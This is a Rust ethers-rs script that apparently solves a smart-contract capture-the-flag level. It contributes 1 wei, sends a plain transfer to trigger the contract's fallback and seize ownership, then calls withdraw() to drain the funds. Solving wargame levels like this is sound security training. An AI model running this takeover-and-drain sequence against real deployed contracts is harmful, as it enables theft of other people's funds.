use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function contribute() public payable
        function withdraw() public onlyOwner
    ]"#,
    event_derives(serde::Deserialize, serde::Serialize)
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());

    let mut receipt = contract
        .contribute()
        .value(1)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "contribute():\n{}\n",
        serde_json::to_string_pretty(&receipt)?
    );

    let tx = TransactionRequest::new().to(contract.address()).value(1);
    receipt = client.send_transaction(tx, None).await?.await?;
    println!("Transfer:\n{}\n", serde_json::to_string_pretty(&receipt)?);

    receipt = contract.withdraw().legacy().send().await?.await?;
    println!("withdraw():\n{}", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
